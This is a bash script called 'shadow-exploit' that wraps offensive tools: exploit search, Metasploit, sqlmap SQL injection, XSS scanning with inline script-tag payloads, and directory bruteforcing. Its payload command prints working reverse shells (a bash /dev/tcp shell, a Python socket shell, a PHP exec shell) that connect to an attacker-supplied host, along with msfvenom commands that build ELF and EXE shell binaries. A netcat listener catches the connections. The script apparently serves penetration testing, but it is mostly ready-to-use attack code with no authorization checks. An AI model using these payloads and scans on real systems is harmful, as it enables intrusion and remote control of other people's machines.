#!/bin/bash
#
# shadow-exploit - Exploitation Framework Wrapper
# /usr/bin/shadow-exploit
#
# Quick access to common exploitation tools
#

set -euo pipefail

VERSION="1.0.0"
OUTPUT_DIR="/shadow/exploits"

log() { echo "[exploit] $*"; }
error() { echo "[exploit] ERROR: $*" >&2; exit 1; }

# Search exploits
cmd_search() {
    local query="$1"
    
    log "Searching for: $query"
    
    if command -v searchsploit &>/dev/null; then
        searchsploit "$query"
    else
        # Fallback to online search
        log "Searching exploit-db.com..."
        curl -s "https://www.exploit-db.com/search?q=$query" | grep -oP 'exploits/\d+' | head -10
    fi
}

# Start Metasploit
cmd_msf() {
    local module="${1:-}"
    
    if ! command -v msfconsole &>/dev/null; then
        error "Metasploit not installed (shadow-toolkit install exploit)"
    fi
    
    if [[ -n "$module" ]]; then
        msfconsole -q -x "use $module"
    else
        msfconsole -q
    fi
}

# SQLMap wrapper
cmd_sql() {
    local url="$1"
    local params="${2:---batch --random-agent}"
    
    mkdir -p "$OUTPUT_DIR/sqlmap"
    
    log "SQL injection test: $url"
    
    if command -v sqlmap &>/dev/null; then
        sqlmap -u "$url" $params --output-dir="$OUTPUT_DIR/sqlmap"
    else
        error "sqlmap not installed"
    fi
}

# XSS scanner
cmd_xss() {
    local url="$1"
    
    log "XSS scan: $url"
    
    if command -v dalfox &>/dev/null; then
        dalfox url "$url" --silence
    else
        # Basic XSS test
        local payloads='<script>alert(1)</script>
"><script>alert(1)</script>
'"'"'><script>alert(1)</script>
<img src=x onerror=alert(1)>'
        
        echo "$payloads" | while read payload; do
            encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
            response=$(curl -s "${url}${encoded}")
            if echo "$response" | grep -q "$payload"; then
                echo "[VULNERABLE] $url with: $payload"
            fi
        done
    fi
}

# Directory bruteforce
cmd_dirb() {
    local url="$1"
    local wordlist="${2:-/usr/share/wordlists/dirb-common.txt}"
    
    log "Directory bruteforce: $url"
    
    if command -v ffuf &>/dev/null; then
        ffuf -w "$wordlist" -u "${url}/FUZZ" -mc 200,301,302,403
    elif command -v gobuster &>/dev/null; then
        gobuster dir -u "$url" -w "$wordlist"
    elif command -v dirb &>/dev/null; then
        dirb "$url" "$wordlist"
    else
        error "No directory scanner found"
    fi
}

# Generate payload
cmd_payload() {
    local type="$1"
    local lhost="${2:-$(hostname -I | awk '{print $1}')}"
    local lport="${3:-4444}"
    
    log "Generating $type payload (LHOST=$lhost LPORT=$lport)"
    
    case "$type" in
        reverse-shell|rs)
            echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
            echo ""
            echo "# Or Python:"
            echo "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
            ;;
        php)
            echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'\"); ?>"
            ;;
        python)
            cat << EOF
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$lhost",$lport))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
EOF
            ;;
        msfvenom)
            log "Use msfvenom:"
            echo "msfvenom -p linux/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o shell"
            echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o shell.exe"
            ;;
        *)
            error "Unknown payload type: $type (use: reverse-shell, php, python, msfvenom)"
            ;;
    esac
}

# Start listener
cmd_listen() {
    local port="${1:-4444}"
    
    log "Starting listener on port $port..."
    
    if command -v rlwrap &>/dev/null && command -v nc &>/dev/null; then
        rlwrap nc -lvnp "$port"
    elif command -v nc &>/dev/null; then
        nc -lvnp "$port"
    elif command -v ncat &>/dev/null; then
        ncat -lvnp "$port"
    else
        error "netcat not found"
    fi
}

show_help() {
    cat << 'EOF'
shadow-exploit - Exploitation Tools

Quick access to common exploitation utilities.

Usage: shadow-exploit <command> [args]

Commands:
  search <query>         Search exploit-db
  msf [module]           Start Metasploit
  sql <url>              SQL injection test
  xss <url>              XSS scanner
  dirb <url> [wordlist]  Directory bruteforce
  payload <type> [lhost] [lport]  Generate payload
  listen [port]          Start netcat listener

Payload types:
  reverse-shell, php, python, msfvenom

Examples:
  shadow-exploit search apache 2.4
  shadow-exploit sql "http://target.com/page?id=1"
  shadow-exploit payload reverse-shell 10.0.0.1 4444
  shadow-exploit listen 4444

Results saved to /shadow/exploits
EOF
}

mkdir -p "$OUTPUT_DIR"

case "${1:-help}" in
    search)   cmd_search "${2:-}" ;;
    msf)      cmd_msf "${2:-}" ;;
    sql)      cmd_sql "${2:-}" "${*:3}" ;;
    xss)      cmd_xss "${2:-}" ;;
    dirb|dir) cmd_dirb "${2:-}" "${3:-}" ;;
    payload)  cmd_payload "${2:-}" "${3:-}" "${4:-}" ;;
    listen)   cmd_listen "${2:-4444}" ;;
    help|-h)  show_help ;;
    *)        error "Unknown: $1" ;;
esac
